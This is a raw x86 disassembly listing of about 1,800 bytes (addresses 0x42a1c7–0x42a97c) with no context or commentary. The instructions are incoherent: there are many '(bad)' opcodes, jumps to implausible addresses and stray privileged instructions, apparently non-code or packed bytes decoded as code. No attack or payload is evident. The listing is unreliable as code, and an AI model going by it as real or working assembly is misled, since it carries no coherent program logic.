  42a1c7:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  42a1ce:	jmp    0x42a22d
  42a1d0:	mov    edi,0xff0272
  42a1d5:	fdivr  QWORD PTR [ebp+0x5d]
  42a1d8:	push   0x4e
  42a1da:	pop    ecx
  42a1db:	call   0x42e5e0
  42a1e0:	mov    DWORD PTR [ebx],eax
  42a1e2:	in     al,0xc8
  42a1e4:	rol    BYTE PTR [ebp-0x75],0xc1
  42a1e8:	call   0xaca3c9
  42a1ed:	pop    esi
  42a1ee:	enter  0xceff,0x8b
  42a1f2:	repz mov ecx,DWORD PTR [ebp-0x34]
  42a1f6:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  42a1fd:	je     0x42a1ff
  42a1ff:	or     DWORD PTR [ebx-0x74183b24],eax
  42a205:	jne    0x42a1eb
  42a207:	jmp    0x42a202
  42a209:	push   DWORD PTR [edx-0x24]
  42a20c:	push   0x4d
  42a20e:	pop    ecx
  42a20f:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42a213:	jge    0x42a21b
  42a215:	mov    eax,eax
  42a217:	sub    ebp,DWORD PTR [edx+0x24]
  42a21a:	pop    esi
  42a21b:	inc    ebp
  42a21c:	mov    esp,0x8b6077
  42a221:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  42a227:	lods   al,BYTE PTR ds:[esi]
  42a228:	add    BYTE PTR [ebx],bh
  42a22a:	enter  0xce73,0x49
  42a22e:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  42a236:	stc    
  42a237:	jge    0x42a2ab
  42a239:	jnp    0xdd42259a
  42a23f:	call   0xc5a315
  42a244:	fadd   st(0),st
  42a246:	dec    esi
  42a247:	ins    BYTE PTR es:[edi],dx
  42a248:	stc    
  42a249:	cmp    al,0x73
  42a24b:	push   ebp
  42a24c:	mov    eax,0xf8028b
  42a251:	jne    0x42a214
  42a253:	mov    esi,ecx
  42a255:	mov    esp,DWORD PTR [ebp+0x2c]
  42a258:	add    edi,DWORD PTR [ebp-0x24]
  42a25b:	sub    esp,eax
  42a25d:	and    al,0x45
  42a25f:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  42a265:	sbb    al,0xee
  42a267:	pop    esi
  42a268:	call   0x82a298
  42a26d:	fsubr  st,st(3)
  42a26f:	sti    
  42a270:	add    BYTE PTR gs:[ecx],bh
  42a273:	add    eax,esp
  42a275:	add    DWORD PTR [esi],eax
  42a277:	rol    DWORD PTR [ebp+0x8],0x29
  42a27b:	mov    esp,eax
  42a27d:	clc    
  42a27e:	jne    0x42a2f5
  42a280:	mov    eax,0x8b0673
  42a285:	loopne 0x42a2cc
  42a287:	loopne 0x42a212
  42a289:	lods   al,BYTE PTR ds:[esi]
  42a28a:	int3   
  42a28b:	inc    ebp
  42a28c:	mov    DWORD PTR gs:[eax+edi*8],eax
  42a290:	add    al,0xc3
  42a292:	sub    ecx,DWORD PTR [ebp+0x47]
  42a295:	(bad)  
  42a297:	shr    BYTE PTR [ebp-0x1f],0xe8
  42a29b:	add    eax,DWORD PTR [eax]
  42a29d:	call   0x64463a2
  42a2a2:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42a2a8:	dec    esi
  42a2a9:	ins    DWORD PTR es:[edi],dx
  42a2aa:	in     al,dx
  42a2ab:	lea    eax,[eax]
  42a2ad:	inc    ebp
  42a2ae:	inc    ebp
  42a2af:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42a2b5:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  42a2bf:	and    al,0xdc
  42a2c1:	ror    DWORD PTR [edx+0x24],0xf7
  42a2c5:	or     BYTE PTR [ebp+0x4c],dh
  42a2c8:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  42a2cc:	stos   BYTE PTR es:[edi],al
  42a2cd:	adc    edx,edi
  42a2cf:	inc    esp
  42a2d0:	add    edi,DWORD PTR [eax]
  42a2d2:	jne    0x42a2b7
  42a2d4:	mov    DWORD PTR [eax-0x7449db04],ecx
  42a2da:	cmp    ecx,DWORD PTR [edi]
  42a2dc:	sub    BYTE PTR [ebp-0x7e],dl
  42a2df:	sar    ebp,0xb
  42a2e2:	jmp    FWORD PTR [edi+0x2400392a]
  42a2e8:	sub    esi,DWORD PTR [ebx-0x73]
  42a2eb:	mov    esp,DWORD PTR [ecx+edi*4]
  42a2ee:	mov    ecx,DWORD PTR [eax]
  42a2f0:	and    BYTE PTR [eax],al
  42a2f2:	jne    0x42a2be
  42a2f4:	sub    ebp,ecx
  42a2f6:	sbb    BYTE PTR [esi+0x32],ah
  42a2f9:	dec    ebp
  42a2fa:	push   ebp
  42a2fb:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  42a301:	ret    
  42a302:	mov    edx,ebp
  42a304:	leave  
  42a305:	sub    DWORD PTR [esi+0x24],ebx
  42a308:	ret    0x2b
  42a30b:	pop    ax
  42a30d:	push   ebp
  42a30e:	rol    BYTE PTR [ebx],0xeb
  42a311:	add    DWORD PTR [ecx+0x6c0001],0x40
  42a318:	jb     0x42a36f
  42a31a:	ret    
  42a31b:	in     al,dx
  42a31c:	jecxz  0x42a2a9
  42a31e:	push   esi
  42a31f:	xchg   esp,eax
  42a320:	jne    0x42a322
  42a322:	cmp    edx,DWORD PTR [esi+0x1c]
  42a325:	jne    0x42a30b
  42a327:	mov    eax,DWORD PTR [ebp-0x77]
  42a32a:	ror    DWORD PTR [ebx+0x899408],0xe0
  42a331:	mov    esi,DWORD PTR [ebp-0x75]
  42a334:	pop    esi
  42a335:	nop
  42a336:	mov    eax,DWORD PTR [eax]
  42a338:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  42a33e:	add    al,0x0
  42a340:	inc    ebp
  42a341:	mov    eax,DWORD PTR [ebx]
  42a343:	mov    ebp,ebx
  42a345:	cmp    al,0xf
  42a347:	or     al,al
  42a349:	inc    ebp
  42a34a:	inc    ebp
  42a34b:	xor    eax,0x8bc89c8b
  42a350:	ins    BYTE PTR es:[edi],dx
  42a351:	cld    
  42a352:	add    BYTE PTR [edi+0x576c16c0],dh
  42a358:	add    BYTE PTR [ecx-0x5],dl
  42a35b:	add    eax,0x17200
  42a360:	sbb    al,0x85
  42a362:	dec    esp
  42a363:	je     0x42a39d
  42a365:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  42a369:	add    BYTE PTR [ebx],bh
  42a36b:	(bad)  
  42a36c:	and    al,0x34
  42a36e:	jae    0x42a30c
  42a370:	mov    cl,cl
  42a372:	inc    DWORD PTR [esp]
  42a375:	push   ebp
  42a376:	shr    esp,0x8
  42a379:	in     al,dx
  42a37a:	push   esp
  42a37b:	add    DWORD PTR [eax],esp
  42a37d:	add    bl,cl
  42a37f:	inc    ebp
  42a380:	mov    bh,0x53
  42a382:	add    BYTE PTR [ebp-0x17],al
  42a385:	push   esi
  42a386:	cmovne ecx,edx
  42a389:	xor    al,0x4c
  42a38b:	pushf  
  42a38c:	and    BYTE PTR [edi+0x17],dl
  42a38f:	xor    eax,0x89009cd9
  42a394:	add    ah,bh
  42a396:	sub    eax,DWORD PTR [ebp-0x3f]
  42a399:	aad    0x5
  42a39b:	inc    ebp
  42a39c:	add    eax,edx
  42a39e:	add    BYTE PTR [ebp-0x40],al
  42a3a1:	xlat   BYTE PTR ds:[ebx]
  42a3a2:	ins    BYTE PTR es:[edi],dx
  42a3a3:	inc    ebp
  42a3a4:	inc    eax
  42a3a5:	and    ecx,eax
  42a3a7:	dec    ecx
  42a3a8:	add    eax,0x202e4c45
  42a3ad:	inc    ebp
  42a3ae:	fnstcw WORD PTR [ecx+ebp*1-0x37]
  42a3b2:	add    BYTE PTR [esi+0xc000c0],bh
  42a3b8:	lea    eax,[esp-0x34]
  42a3bc:	ret    
  42a3bd:	mov    dh,0x8b
  42a3bf:	xor    edx,DWORD PTR [ecx+0x3]
  42a3c2:	mov    al,BYTE PTR [ecx+0x1]
  42a3c5:	sbb    BYTE PTR [eax],al
  42a3c7:	stc    
  42a3c8:	mov    esi,DWORD PTR [edx+0x8]
  42a3cb:	(bad)  
  42a3cc:	les    esi,FWORD PTR ss:[ecx]
  42a3cf:	(bad)  
  42a3d0:	mov    al,ch
  42a3d2:	add    esi,eax
  42a3d4:	add    dh,al
  42a3d6:	or     esi,eax
  42a3d8:	mov    dl,0xc7
  42a3da:	add    esi,eax
  42a3dc:	add    al,cl
  42a3de:	push   cs
  42a3df:	mov    BYTE PTR [edx+0xc601c9],0xca
  42a3e6:	or     BYTE PTR [ebx],dh
  42a3e8:	dec    ecx
  42a3e9:	lea    eax,[ebx]
  42a3eb:	or     eax,0x18fc0fc7
  42a3f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a3f1:	(bad)  
  42a3f3:	fiadd  WORD PTR [ebp-0x78]
  42a3f6:	jae    0xed77ab45
  42a3fc:	or     BYTE PTR [ebp+0x7],al
  42a3ff:	loope  0x42a39f
  42a401:	inc    ebp
  42a402:	xor    dl,ah
  42a404:	pop    esi
  42a405:	inc    ebp
  42a406:	shr    eax,0xc
  42a409:	inc    ebp
  42a40a:	and    ch,0x1
  42a40d:	inc    ebp
  42a40e:	add    bh,bl
  42a410:	add    BYTE PTR [ebp-0x7b],al
  42a413:	in     al,dx
  42a414:	clc    
  42a415:	inc    ebp
  42a416:	ret    0xd7
  42a419:	inc    ebp
  42a41a:	mov    edi,DWORD PTR [ecx+eax*4-0x37]
  42a41e:	sub    al,0x44
  42a420:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  42a427:	add    ebx,DWORD PTR [ecx+eax*2]
  42a42a:	(bad)  
  42a42b:	sbb    al,ah
  42a42d:	stc    
  42a42e:	test   DWORD PTR [edx-0x8],esi
  42a431:	lea    edi,[edi-0x7007aa4]
  42a437:	mov    DWORD PTR [ebp-0x24],edi
  42a43a:	(bad)  
  42a43b:	dec    ebp
  42a43c:	int3   
  42a43d:	mov    eax,0x71cdfcc6
  42a442:	mov    BYTE PTR [ecx],0xce
  42a445:	(bad)  
  42a446:	(bad)  
  42a447:	dec    edi
  42a449:	jmp    FWORD PTR [edx-0x38]
  42a44c:	(bad)  
  42a44d:	or     dl,al
  42a44f:	jge    0x42a417
  42a451:	(bad)  
  42a452:	shl    esp,1
  42a454:	xor    eax,DWORD PTR [ebp+0x45cbf85a]
  42a45a:	add    BYTE PTR [ebx+0xd8c8d],cl
  42a460:	rdpmc  
  42a462:	sbb    BYTE PTR [edi+0x7de08da],bh
  42a468:	mov    BYTE PTR [esi+0x39063283],bl
  42a46e:	in     eax,dx
  42a46f:	cmovne ebx,DWORD PTR [edx]
  42a472:	jecxz  0x42a474
  42a474:	inc    ebp
  42a475:	mov    esp,ecx
  42a477:	sbb    al,0x45
  42a479:	mov    ebx,edx
  42a47b:	add    DWORD PTR [ebp+0x0],eax
  42a47e:	out    dx,al
  42a47f:	add    DWORD PTR [ebp+0x4d],eax
  42a482:	and    DWORD PTR [ebx+0x2e8045],ecx
  42a488:	inc    ebp
  42a489:	mov    DWORD PTR [edx+ebp*2-0x37],edi
  42a48d:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d4
  42a495:	inc    ebp
  42a496:	add    ebx,edi
  42a498:	inc    ecx
  42a499:	xlat   BYTE PTR ds:[ebx]
  42a49a:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  42a4a0:	(bad)  
  42a4a1:	xor    bh,BYTE PTR [eax+eax*4+0x8bd35c6]
  42a4a8:	(bad)  
  42a4a9:	dec    esi
  42a4aa:	mov    esi,0xbf45c6f3
  42a4af:	mov    esi,eax
  42a4b1:	fadd   st,st(0)
  42a4b3:	inc    esi
  42a4b5:	(bad)  
  42a4b6:	rcl    esp,0xc6
  42a4b9:	inc    edx
  42a4bb:	push   eax
  42a4bc:	mov    BYTE PTR [ebp-0x3d],0x33
  42a4c0:	xor    eax,DWORD PTR [ebx]
  42a4c2:	lea    edx,[eax+0xd]
  42a4c5:	inc    ebp
  42a4c6:	jae    0x8c1d0ae4
  42a4cc:	ficomp WORD PTR [eax+ecx*4]
  42a4cf:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  42a4d6:	test   esi,edi
  42a4d8:	(bad)  
  42a4d9:	(bad)  
  42a4da:	inc    DWORD PTR [eax]
  42a4dc:	inc    ebp
  42a4dd:	add    BYTE PTR [ebx-0x10aa23d0],cl
  42a4e3:	mov    edx,DWORD PTR [ebx]
  42a4e5:	cld    
  42a4e6:	mov    edi,ecx
  42a4e8:	mov    ecx,ebx
  42a4ea:	pop    esp
  42a4eb:	sar    edi,0x1e
  42a4ee:	cmp    ebp,esi
  42a4f0:	jne    0x42a565
  42a4f2:	mov    DWORD PTR ds:0x22450be4,ecx
  42a4f8:	loop   0x42a4e8
  42a4fa:	pushf  
  42a4fb:	jae    0x42a488
  42a4fd:	add    eax,0x3388e91c
  42a502:	add    esi,ebp
  42a504:	add    BYTE PTR [ebx-0x40],dh
  42a507:	jmp    0x93a563
  42a50c:	mov    ebx,0x6a7275
  42a511:	pop    ecx
  42a512:	add    DWORD PTR [ebp+eax*4-0x77],esi
  42a516:	add    bh,BYTE PTR [eax+0x0]
  42a519:	dec    DWORD PTR [ebp+0x66]
  42a51c:	mov    ecx,DWORD PTR [ebp-0xff0084]
  42a522:	mov    DWORD PTR [edx-0x75],ebp
  42a525:	data16 sbb al,0x8d
  42a528:	mov    edi,edi
  42a52a:	add    edi,edi
  42a52c:	add    BYTE PTR [edx+0x1],ch
  42a52f:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  42a536:	call   0xd8906ca1
  42a53b:	push   0xffffffec
  42a53d:	pop    ecx
  42a53e:	jl     0x42a4c9
  42a540:	inc    ebp
  42a541:	sbb    BYTE PTR [esi-0x37],0x8
  42a545:	test   edx,ecx
  42a547:	(bad)  
  42a548:	jmp    0x41032e4c
  42a54d:	push   ebp
  42a54e:	jne    0x42a5b6
  42a550:	lea    ecx,[ebp-0x2c]
  42a553:	mov    DWORD PTR [ebp-0x200158],0xfe4585d4
  42a55d:	into   
  42a55e:	(bad)  
  42a55f:	jmp    0x42a4ec
  42a561:	(bad)  
  42a562:	loopne 0x42a514
  42a564:	(bad)  
  42a565:	rol    ebx,cl
  42a567:	call   0xdf5eeaf7
  42a56c:	shr    cl,0x50
  42a56f:	inc    bp
  42a571:	inc    ebp
  42a572:	mov    eax,ebp
  42a574:	cwde   
  42a575:	mov    DWORD PTR [eax],0xd4ffc7d4
  42a57b:	add    bh,bh
  42a57d:	add    BYTE PTR [ecx],al
  42a57f:	call   0x141bd84
  42a584:	inc    DWORD PTR [ebp-0xb201f8]
  42a58a:	xor    eax,DWORD PTR [ebp-0xc401fd]
  42a590:	jne    0x42a51d
  42a592:	mov    eax,ds:0x33c70be0
  42a597:	ret    
  42a598:	out    dx,eax
  42a599:	mov    edx,DWORD PTR ds:0xbc0a31c
  42a59f:	push   eax
  42a5a0:	xor    eax,DWORD PTR [ebp-0x71]
  42a5a3:	mov    esi,DWORD PTR [edx-0x68]
  42a5a6:	mov    ds:0x33ff0b00,eax
  42a5ab:	(bad)  
  42a5ac:	mov    ecx,0x8b8d0008
  42a5b1:	call   FWORD PTR [edi+edi*8]
  42a5b4:	and    bh,bh
  42a5b6:	push   0x66
  42a5b8:	mov    bp,0xff8d
  42a5bc:	(bad)  
  42a5bd:	(bad)  
  42a5be:	dec    DWORD PTR [edi]
  42a5c0:	mov    DWORD PTR [edx],eax
  42a5c2:	jp     0x42a5c4
  42a5c4:	(bad)  
  42a5c5:	mov    ecx,0x774f59
  42a5ca:	mov    ecx,eax
  42a5cc:	jl     0x42a557
  42a5ce:	dec    DWORD PTR [eax-0x74c73fa7]
  42a5d4:	mov    DWORD PTR [esi+0x7e],esp
  42a5d7:	push   ebp
  42a5d8:	dec    DWORD PTR [ebp-0x7676f2a7]
  42a5de:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  42a5e6:	xor    ecx,DWORD PTR [ebp-0x7627ec77]
  42a5ec:	call   DWORD PTR [eax+0x668dc233]
  42a5f2:	test   al,0x55
  42a5f4:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  42a5fa:	int3   
  42a5fb:	xchg   esp,eax
  42a5fc:	loopne 0x42a587
  42a5fe:	(bad)  
  42a5ff:	xchg   esi,eax
  42a600:	lods   al,BYTE PTR ds:[esi]
  42a601:	ret    0x8bd3
  42a604:	in     eax,dx
  42a605:	inc    bp
  42a607:	dec    ebp
  42a608:	loop   0x42a5c3
  42a60a:	ds dec edi
  42a60c:	mov    DWORD PTR [eax],0x89eaf1b4
  42a612:	loope  0x42a678
  42a614:	(bad)  
  42a615:	(bad)  
  42a616:	mov    eax,0x85667c8b
  42a61b:	mov    ch,0xfe
  42a61d:	(bad)  
  42a61e:	(bad)  
  42a61f:	inc    DWORD PTR [eax]
  42a621:	jno    0x42a623
  42a623:	data16 mov bl,0xb5
  42a626:	add    bh,bh
  42a628:	mov    edi,edi
  42a62a:	fmul   QWORD PTR [ecx-0x729501]
  42a630:	aam    0x8d
  42a632:	call   ebx
  42a634:	push   eax
  42a635:	mov    DWORD PTR [ebp+0x6c],eax
  42a638:	xor    edi,edi
  42a63a:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  42a640:	sub    DWORD PTR [esi+0x44],0xffffffff
  42a644:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  42a64a:	add    DWORD PTR [eax+0x0],esi
  42a64d:	push   DWORD PTR [eax]
  42a64f:	push   bp
  42a651:	lea    ecx,[ebp-0x8701]
  42a657:	mov    DWORD PTR [ecx+0x74],edx
  42a65a:	sar    bh,1
  42a65c:	or     DWORD PTR [ebx-0x48000386],0x77
  42a663:	fs test edi,edi
  42a666:	add    al,0x33
  42a668:	add    BYTE PTR [ebx],al
  42a66a:	adc    dh,BYTE PTR [ebx]
  42a66c:	add    BYTE PTR [esi-0x75],ah
  42a66f:	test   DWORD PTR [esi-0x1],esp
  42a672:	inc    ebp
  42a673:	inc    DWORD PTR [ebx-0x2ff00abb]
  42a679:	dec    ebp
  42a67a:	mov    DWORD PTR [ebx],esi
  42a67c:	mov    al,BYTE PTR [ebx]
  42a67e:	push   ecx
  42a67f:	xor    esp,DWORD PTR [esi+0x66]
  42a682:	push   ebp
  42a683:	inc    ebp
  42a684:	xor    DWORD PTR [ebx],0x8
  42a687:	mov    WORD PTR [ebp-0x72],ax
  42a68b:	push   cx
  42a68d:	inc    ebp
  42a68e:	adc    WORD PTR [ebp-0x64],0xff83
  42a693:	mov    DWORD PTR [ebx],0x92b589f8
  42a699:	clc    
  42a69a:	push   ecx
  42a69b:	inc    ebp
  42a69c:	data16 cmc 
  42a69e:	push   ebp
  42a69f:	pushf  
  42a6a0:	data16 (bad) 
  42a6a2:	dec    ebp
  42a6a3:	in     al,0x83
  42a6a5:	test   DWORD PTR [edi-0x76ba3508],eax
  42a6ab:	xor    ebx,DWORD PTR [eax+0xc7329c]
  42a6b1:	in     al,0x8b
  42a6b3:	add    eax,0x45b5f866
  42a6b8:	dec    DWORD PTR [ebx+0xf094ff]
  42a6be:	mov    DWORD PTR [ecx+0x45fff466],ecx
  42a6c4:	lea    ecx,[ebx-0x4e76e3b3]
  42a6ca:	push   0x6600ff01
  42a6cf:	push   cs
  42a6d0:	test   DWORD PTR [eax+0xff01ff],eax
  42a6d6:	inc    ecx
  42a6d7:	inc    ebp
  42a6d8:	mov    WORD PTR [ebp-0x360018],ax
  42a6df:	push   cs
  42a6e0:	shl    BYTE PTR [ebp+0x66],0x8b
  42a6e4:	test   DWORD PTR [edi+edi*8],ebx
  42a6e7:	cs (bad) 
  42a6e9:	inc    DWORD PTR [ecx-0x75]
  42a6ec:	data16 in al,dx
  42a6ee:	test   DWORD PTR [eax],ecx
  42a6f0:	inc    DWORD PTR [eax]
  42a6f2:	inc    DWORD PTR [ecx-0x77]
  42a6f5:	mov    esi,DWORD PTR [edx-0x77]
  42a6f8:	call   FWORD PTR [eax]
  42a6fa:	leavew 
  42a6fc:	xchg   ebp,eax
  42a6fd:	inc    edi
  42a6fe:	push   DWORD PTR [ebp-0x1]
  42a701:	call   0xff52924b
  42a706:	lea    eax,[ebp-0x1]
  42a709:	mov    edi,edi
  42a70b:	enter  0xc7,0xc3
  42a70f:	mov    eax,ecx
  42a711:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  42a717:	sbb    al,0x8b
  42a719:	sbb    esp,edi
  42a71b:	dec    ebp
  42a71c:	mov    bh,0x8b
  42a71e:	mov    ah,cl
  42a720:	mov    DWORD PTR [eax],0x8bc1ffc3
  42a726:	mov    eax,ebx
  42a728:	mov    BYTE PTR [eax],al
  42a72a:	sar    bh,0x89
  42a72d:	sub    BYTE PTR [eax-0x77ff766c],cl
  42a733:	mov    esp,DWORD PTR [ebp+0x7c]
  42a736:	add    BYTE PTR [eax],al
  42a738:	inc    ebp
  42a739:	mov    esi,DWORD PTR ds:0xc7049c8d
  42a73f:	or     ah,bl
  42a741:	add    BYTE PTR [ebp+0x458bf800],0x85
  42a748:	xor    DWORD PTR [edi],ecx
  42a74a:	pushf  
  42a74b:	js     0x42a714
  42a74d:	add    al,dh
  42a74f:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  42a755:	inc    eax
  42a756:	xor    eax,0x8b209f89
  42a75b:	call   FWORD PTR [ebx+ecx*4]
  42a75e:	cmp    al,0x1
  42a761:	mov    DWORD PTR [eax],0x8b8545c3
  42a767:	call   FWORD PTR [edi+edi*8]
  42a76a:	dec    ebp
  42a76b:	inc    ebp
  42a76c:	mov    eax,DWORD PTR [ebx-0xffe374]
  42a772:	mov    eax,DWORD PTR [eax]
  42a774:	mov    eax,edi
  42a776:	nop
  42a777:	ret    
  42a778:	add    BYTE PTR [ebp-0x130077],al
  42a77e:	jne    0x42a705
  42a780:	test   edi,edi
  42a782:	jne    0x42a783
  42a784:	dec    DWORD PTR [ebx-0x38aa1fe8]
  42a78a:	call   0xffcea452
  42a78f:	sbb    al,0x45
  42a791:	stos   BYTE PTR es:[edi],al
  42a792:	mov    eax,DWORD PTR [eax]
  42a794:	mov    edx,DWORD PTR [eax+0x3]
  42a797:	inc    ebp
  42a798:	cmp    al,0x8b
  42a79a:	push   cs
  42a79b:	cwde   
  42a79c:	inc    ebp
  42a79d:	add    BYTE PTR [ebp-0xe78b39],al
  42a7a3:	call   FWORD PTR [esp+eax*1]
  42a7a6:	test   eax,0x8bffff00
  42a7ab:	mov    DWORD PTR [esp+eiz*4],ebx
  42a7ae:	adc    BYTE PTR [ebp+0x1],0x8b
  42a7b2:	add    al,ch
  42a7b4:	add    al,dh
  42a7b6:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  42a7bd:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  42a7c3:	inc    ebp
  42a7c4:	add    DWORD PTR [ebx-0x7aceb000],ecx
  42a7ca:	cmp    bh,0x1
  42a7cd:	inc    DWORD PTR [eax]
  42a7cf:	inc    ebp
  42a7d0:	push   eax
  42a7d1:	xor    ebp,ecx
  42a7d3:	add    eax,DWORD PTR [edx]
  42a7d5:	mov    DWORD PTR [eax],eax
  42a7d7:	and    al,0x80
  42a7d9:	inc    DWORD PTR [ecx]
  42a7db:	lea    eax,[eax]
  42a7dd:	pushf  
  42a7de:	or     BYTE PTR [ebp-0xfe00bb],al
  42a7e4:	jmp    0x141aa6e
  42a7e9:	dec    DWORD PTR [esi]
  42a7eb:	mov    ecx,ecx
  42a7ed:	loopne 0x42a774
  42a7ef:	mov    DWORD PTR [edx],0x4d8b00c3
  42a7f5:	sbb    al,0x8b
  42a7f7:	out    dx,al
  42a7f8:	mov    eax,DWORD PTR [eax]
  42a7fa:	push   eax
  42a7fb:	push   eax
  42a7fc:	test   DWORD PTR [ebp-0x1],eax
  42a7ff:	mov    edi,edi
  42a801:	cwde   
  42a802:	inc    ebp
  42a803:	add    BYTE PTR [ebx],dh
  42a805:	mov    DWORD PTR [ebx],0x24ff8918
  42a80b:	add    al,0xff
  42a80d:	add    BYTE PTR [ebx-0x5ae30f77],cl
  42a813:	(bad)  
  42a814:	(bad)  
  42a815:	(bad)  
  42a816:	(bad)  
  42a817:	push   DWORD PTR [ebx]
  42a819:	or     BYTE PTR [ebx],al
  42a81b:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  42a822:	(bad)  
  42a823:	cld    
  42a824:	sbb    BYTE PTR [ebx+0x765050ff],al
  42a82a:	inc    ebp
  42a82b:	mov    esi,DWORD PTR [ebx]
  42a82d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a82e:	add    ecx,esi
  42a830:	push   eax
  42a831:	mov    BYTE PTR [ebp+0x4d],0x5
  42a835:	jmp    0x42a837
  42a837:	mov    eax,DWORD PTR [eax]
  42a839:	clc    
  42a83a:	mov    ecx,DWORD PTR [esp+ebx*1]
  42a83d:	inc    DWORD PTR [eax+0x5501fc]
  42a843:	mov    BYTE PTR [ebp-0xe70075],al
  42a849:	cmp    eax,DWORD PTR [eax]
  42a84b:	push   eax
  42a84c:	add    cl,ch
  42a84e:	xor    BYTE PTR [esi+0x4d],cl
  42a851:	add    edi,edi
  42a853:	mov    ecx,DWORD PTR [eax]
  42a855:	mov    al,ds:0x8b8b004d
  42a85a:	mov    ebp,DWORD PTR [ebx]
  42a85c:	hlt    
  42a85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a85e:	add    dh,al
  42a860:	add    DWORD PTR [ebp+0x45],edx
  42a863:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  42a869:	dec    ebp
  42a86a:	inc    eax
  42a86b:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  42a871:	add    BYTE PTR [ebx-0x38162400],cl
  42a877:	add    bl,al
  42a879:	add    BYTE PTR [ebp-0x2e003e],al
  42a87f:	mov    DWORD PTR [ebp-0x10],eax
  42a882:	mov    DWORD PTR [ebp+0x28],esp
  42a885:	push   eax
  42a886:	dec    DWORD PTR [ecx+0x5518e88d]
  42a88c:	dec    DWORD PTR [ecx+0x5545f050]
  42a892:	xor    ecx,DWORD PTR [edi]
  42a894:	add    edx,DWORD PTR [edx]
  42a896:	push   eax
  42a897:	xchg   ebp,eax
  42a898:	inc    ebp
  42a899:	inc    DWORD PTR ds:0xe200ff
  42a89f:	jnp    0x8097c4a5
  42a8a5:	mov    eax,DWORD PTR [ecx]
  42a8a7:	pusha  
  42a8a8:	add    bh,bh
  42a8aa:	test   ecx,eax
  42a8ac:	dec    DWORD PTR [edi+edi*8]
  42a8af:	ret    0x8d00
  42a8b2:	add    bh,bh
  42a8b4:	mov    ch,0xd7
  42a8b6:	(bad)  
  42a8b7:	cli    
  42a8b8:	inc    DWORD PTR [ebp+0x2255f830]
  42a8be:	test   DWORD PTR [ebp+0x74],ecx
  42a8c1:	add    ecx,DWORD PTR [ebx+0x65a01889]
  42a8c7:	or     BYTE PTR [eax],al
  42a8c9:	cmp    DWORD PTR [eax+0x74],edi
  42a8cc:	add    BYTE PTR [ebx+0x114dfc23],cl
  42a8d2:	sub    eax,DWORD PTR [eax]
  42a8d4:	mov    ecx,DWORD PTR [ebp-0x77]
  42a8d7:	mov    eax,edi
  42a8d9:	add    DWORD PTR [ebx],eax
  42a8db:	inc    ebp
  42a8dc:	dec    ebp
  42a8dd:	mov    ecx,DWORD PTR [edx+0x45450118]
  42a8e3:	add    cl,BYTE PTR [ebx+0x875fc4d]
  42a8e9:	mov    ecx,DWORD PTR [ebp-0xc]
  42a8ec:	inc    eax
  42a8ed:	push   ebp
  42a8ee:	push   ecx
  42a8ef:	mov    esi,DWORD PTR [edx-0x14]
  42a8f2:	mov    edx,DWORD PTR [ecx+0xce003c]
  42a8f8:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  42a8ff:	add    al,0x55
  42a901:	push   ebp
  42a902:	add    ecx,DWORD PTR [ecx-0x2d030777]
  42a908:	push   ecx
  42a909:	test   DWORD PTR [ebx],eax
  42a90b:	dec    DWORD PTR [ecx+0x554518ff]
  42a911:	mov    edi,eax
  42a913:	sbb    al,0xec
  42a915:	inc    DWORD PTR [eax]
  42a917:	mov    DWORD PTR [eax],0xff8318
  42a91d:	add    al,0x83
  42a91f:	add    al,bh
  42a921:	mov    ebp,edx
  42a923:	push   eax
  42a924:	push   ebp
  42a925:	test   DWORD PTR [edi+edi*8-0x73],esi
  42a929:	dec    DWORD PTR [eax]
  42a92b:	inc    ebp
  42a92c:	push   ebp
  42a92d:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  42a933:	and    al,0x8b
  42a935:	(bad)  
  42a936:	call   0x89df60c8
  42a93b:	test   DWORD PTR [eax-0x1],esp
  42a93e:	(bad)  
  42a93f:	inc    DWORD PTR [ecx+0xffff85]
  42a945:	dec    DWORD PTR [ecx-0x6a1f5f75]
  42a94b:	(bad)  
  42a94c:	inc    ebx
  42a94e:	dec    DWORD PTR [ebx-0x117ee316]
  42a954:	bound  eax,QWORD PTR [eax]
  42a956:	int    0x50
  42a958:	xor    eax,DWORD PTR [ebp-0x7f]
  42a95b:	mov    esi,DWORD PTR [edx]
  42a95d:	cwde   
  42a95e:	pushf  
  42a95f:	add    BYTE PTR [ebp-0x1],dh
  42a962:	mov    edi,edi
  42a964:	mov    al,ds:0x4d45ce08
  42a969:	inc    DWORD PTR [ebx]
  42a96b:	adc    al,0x83
  42a96d:	add    BYTE PTR [eax],0x1
  42a970:	adc    BYTE PTR [eax],al
  42a972:	push   ebp
  42a973:	inc    ebp
  42a974:	add    edi,edi
  42a976:	mov    edx,DWORD PTR [eax]
  42a978:	mov    ecx,DWORD PTR [ebp-0x60]
  42a97b:	push   esi
  42a97c:	adc    al,0x8
